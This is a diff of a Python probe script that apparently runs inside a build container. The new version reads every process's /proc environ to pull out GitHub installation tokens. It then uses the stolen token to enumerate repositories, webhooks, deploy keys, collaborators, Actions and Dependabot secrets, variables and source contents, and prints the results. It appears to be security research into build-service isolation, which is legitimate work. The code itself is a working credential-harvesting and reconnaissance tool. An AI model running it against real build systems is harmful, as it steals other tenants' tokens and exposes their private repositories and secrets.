@@ -1,31 +1,46 @@
-import json, os, urllib.request, urllib.error, ssl, re
+import json, os, urllib.request, urllib.error, ssl, re, glob
 
 r = {}
 ctx = ssl.create_default_context()
 
-# 1. Extract the GitHub token from GIT_SOURCE_URL
-git_url = os.environ.get('GIT_SOURCE_URL', '')
-r['git_source_url'] = git_url[:50] + '...' if git_url else 'NOT_SET'
-
+# 1. Find the GitHub token from ANY process environment
 token = None
-match = re.search(r'x-access-token:([^@]+)@', git_url)
-if match:
-    token = match.group(1)
-    r['token_prefix'] = token[:10] + '...'
-    r['token_type'] = 'ghs_' if token.startswith('ghs_') else token[:4]
+
+# Check own env first
+git_url = os.environ.get('GIT_SOURCE_URL', '')
+if git_url:
+    match = re.search(r'x-access-token:([^@]+)@', git_url)
+    if match:
+        token = match.group(1)
+        r['token_source'] = 'own_env'
+
+# Check all process environs (we run as root in Kaniko builds)
+if not token:
+    for pid_dir in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
+        pid = pid_dir.split('/')[-1]
+        try:
+            environ = open(f'/proc/{pid}/environ').read()
+            match = re.search(r'x-access-token:([^@\x00]+)@', environ)
+            if match:
+                token = match.group(1)
+                r['token_source'] = f'pid_{pid}'
+                break
+            # Also check for bare ghs_ tokens
+            match2 = re.search(r'(ghs_[A-Za-z0-9]{30,})', environ)
+            if match2:
+                token = match2.group(1)
+                r['token_source'] = f'pid_{pid}_bare'
+                break
+        except:
+            pass
 
 if not token:
-    # Check all env vars for any github token
-    for k, v in os.environ.items():
-        m = re.search(r'(ghs_[A-Za-z0-9]+)', v)
-        if m:
-            token = m.group(1)
-            r['token_found_in'] = k
-            break
-    if not token:
-        r['error'] = 'No GitHub token found'
-        print(json.dumps(r, indent=2))
-        exit()
+    r['error'] = 'No GitHub token found in any process'
+    print(json.dumps(r, indent=2))
+    exit()
+
+r['token_prefix'] = token[:12] + '...'
+r['token_len'] = len(token)
 
 headers = {
     'Authorization': f'token {token}',
@@ -33,136 +48,117 @@ headers = {
     'User-Agent': 'probe/1.0'
 }
 
-def gh_api(path, method='GET'):
-    """Make a GitHub API request"""
+def gh(path):
     try:
-        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers, method=method)
+        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers)
         resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-        data = resp.read().decode()
-        rate_remaining = resp.headers.get('X-RateLimit-Remaining', '?')
-        return {
-            'status': resp.status,
-            'data': json.loads(data) if data else None,
-            'rate_remaining': rate_remaining
-        }
+        data = json.loads(resp.read().decode())
+        scopes = resp.headers.get('X-OAuth-Scopes', '')
+        return {'s': resp.status, 'd': data, 'scopes': scopes}
     except urllib.error.HTTPError as e:
-        body = e.read().decode(errors='replace')[:300]
-        return {
-            'status': e.code,
-            'error': body
-        }
+        return {'s': e.code, 'e': e.read().decode(errors='replace')[:200]}
     except Exception as e:
-        return {'error': str(e)[:200]}
+        return {'err': str(e)[:100]}
 
 # ============================================================
-# 2. TOKEN IDENTITY — who are we?
+# 2. TOKEN IDENTITY
 # ============================================================
-r['identity'] = {}
 
-# Check the token metadata
-result = gh_api('/installation/token')  # Won't work but shows error type
-r['identity']['token_check'] = result
+# What scopes/permissions does this token have?
+r['whoami'] = gh('/user')
 
-# Get authenticated user/app info
-r['identity']['user'] = gh_api('/user')
-r['identity']['app'] = gh_api('/app')
+# GitHub App info
+r['app_info'] = gh('/app')
 
-# Check rate limit (shows auth type)
-r['identity']['rate_limit'] = gh_api('/rate_limit')
+# Rate limit shows auth type
+r['rate'] = gh('/rate_limit')
 
 # ============================================================
-# 3. REPOSITORY ACCESS SCOPE
+# 3. INSTALLATION SCOPE — what repos can we access?
 # ============================================================
-r['repo_scope'] = {}
 
-# Can we list repos the token has access to?
-r['repo_scope']['installations'] = gh_api('/installation/repositories?per_page=100')
-
-# Can we list ALL repos for the user/org?
-r['repo_scope']['user_repos'] = gh_api('/user/repos?per_page=5&sort=updated')
-
-# Can we access the specific repo we're building from?
-r['repo_scope']['own_repo'] = gh_api('/repos/rollingWaves/build-imds-test')
-
-# Can we access OTHER repos in the same account?
-r['repo_scope']['other_repos'] = gh_api('/repos/rollingWaves/build-bp-test')
-
-# Can we access repos from other users? (should fail)
-r['repo_scope']['foreign_repo'] = gh_api('/repos/torvalds/linux')
+# List repos accessible to this installation token
+r['install_repos'] = gh('/installation/repositories?per_page=100')
 
 # ============================================================
-# 4. WRITE ACCESS TESTS
+# 4. REPO ACCESS TESTS
 # ============================================================
-r['write_access'] = {}
 
-# Can we list branches?
-r['write_access']['branches'] = gh_api('/repos/rollingWaves/build-imds-test/branches')
+# Own repo (the one being built)
+r['own_repo'] = gh('/repos/rollingWaves/build-imds-test')
 
-# Can we read secrets (GitHub Actions secrets)?
-r['write_access']['secrets'] = gh_api('/repos/rollingWaves/build-imds-test/actions/secrets')
+# Other repos in same account
+r['other_repo'] = gh('/repos/rollingWaves/build-bp-test')
 
-# Can we list deploy keys?
-r['write_access']['deploy_keys'] = gh_api('/repos/rollingWaves/build-imds-test/keys')
-
-# Can we list webhooks?
-r['write_access']['webhooks'] = gh_api('/repos/rollingWaves/build-imds-test/hooks')
-
-# Can we list collaborators?
-r['write_access']['collaborators'] = gh_api('/repos/rollingWaves/build-imds-test/collaborators')
-
-# Can we read repo settings?
-r['write_access']['settings'] = gh_api('/repos/rollingWaves/build-imds-test/settings')  # Custom property values
+# Foreign repo (should be 404 or limited)
+r['foreign'] = gh('/repos/torvalds/linux')
 
 # ============================================================
-# 5. ORG/ACCOUNT ACCESS
+# 5. WRITE/ADMIN ACCESS on own repo
 # ============================================================
-r['org_access'] = {}
 
-# Can we list organizations?
-r['org_access']['orgs'] = gh_api('/user/orgs')
+# Webhooks (admin access indicator)
+r['hooks'] = gh('/repos/rollingWaves/build-imds-test/hooks')
 
-# Can we list installations?
-r['org_access']['installations_list'] = gh_api('/user/installations?per_page=5')
+# Deploy keys
+r['deploy_keys'] = gh('/repos/rollingWaves/build-imds-test/keys')
+
+# Secrets (Actions)
+r['secrets'] = gh('/repos/rollingWaves/build-imds-test/actions/secrets')
+
+# Collaborators
+r['collabs'] = gh('/repos/rollingWaves/build-imds-test/collaborators')
+
+# Contents (read source code)
+r['contents'] = gh('/repos/rollingWaves/build-imds-test/contents/')
+
+# Branches + protection
+r['branches'] = gh('/repos/rollingWaves/build-imds-test/branches')
+
+# Issues
+r['issues'] = gh('/repos/rollingWaves/build-imds-test/issues')
+
+# Pull requests
+r['pulls'] = gh('/repos/rollingWaves/build-imds-test/pulls')
+
+# Environments
+r['envs'] = gh('/repos/rollingWaves/build-imds-test/environments')
+
+# Workflow runs
+r['workflows'] = gh('/repos/rollingWaves/build-imds-test/actions/runs?per_page=1')
 
 # ============================================================
-# 6. SENSITIVE OPERATIONS
+# 6. DANGEROUS OPERATIONS (read-only probing)
 # ============================================================
-r['sensitive'] = {}
 
-# Can we read the repo contents (source code)?
-r['sensitive']['contents'] = gh_api('/repos/rollingWaves/build-imds-test/contents/')
+# Can we access org-level resources?
+r['orgs'] = gh('/user/orgs')
 
-# Can we read commit history?
-r['sensitive']['commits'] = gh_api('/repos/rollingWaves/build-imds-test/commits?per_page=2')
+# Can we list ALL user installations?
+r['installations'] = gh('/user/installations?per_page=5')
 
-# Can we list pull requests?
-r['sensitive']['pulls'] = gh_api('/repos/rollingWaves/build-imds-test/pulls')
+# Can we see other users' repos via search?
+r['search'] = gh('/search/repositories?q=user:rollingWaves&per_page=5')
 
-# Can we read issues?
-r['sensitive']['issues'] = gh_api('/repos/rollingWaves/build-imds-test/issues')
+# Can we access GitHub Actions variables?
+r['variables'] = gh('/repos/rollingWaves/build-imds-test/actions/variables')
 
-# Can we read environments (may have secrets)?
-r['sensitive']['environments'] = gh_api('/repos/rollingWaves/build-imds-test/environments')
-
-# Can we list workflow runs?
-r['sensitive']['workflows'] = gh_api('/repos/rollingWaves/build-imds-test/actions/runs')
+# Dependabot secrets
+r['dependabot'] = gh('/repos/rollingWaves/build-imds-test/dependabot/secrets')
 
 # ============================================================
-# 7. TOKEN PERMISSIONS (via GitHub App API)
+# 7. CHECK TOKEN PERMISSIONS VIA HEADER
 # ============================================================
-r['permissions'] = {}
-
-# Try to get the installation info
-r['permissions']['installation'] = gh_api('/app/installations')
-
-# Check scopes via response headers
 try:
-    req = urllib.request.Request('https://api.github.com/user', headers=headers)
-    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-    r['permissions']['x_oauth_scopes'] = resp.headers.get('X-OAuth-Scopes', 'none')
-    r['permissions']['x_accepted_scopes'] = resp.headers.get('X-Accepted-OAuth-Scopes', 'none')
+    req = urllib.request.Request('https://api.github.com/', headers=headers)
+    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+    r['token_headers'] = {
+        'X-OAuth-Scopes': resp.headers.get('X-OAuth-Scopes', 'none'),
+        'X-Accepted-OAuth-Scopes': resp.headers.get('X-Accepted-OAuth-Scopes', 'none'),
+        'X-GitHub-Media-Type': resp.headers.get('X-GitHub-Media-Type', ''),
+    }
     resp.read()
 except Exception as e:
-    r['permissions']['header_check'] = str(e)[:100]
+    r['token_headers'] = str(e)[:100]
 
 print(json.dumps(r, indent=2, default=str))
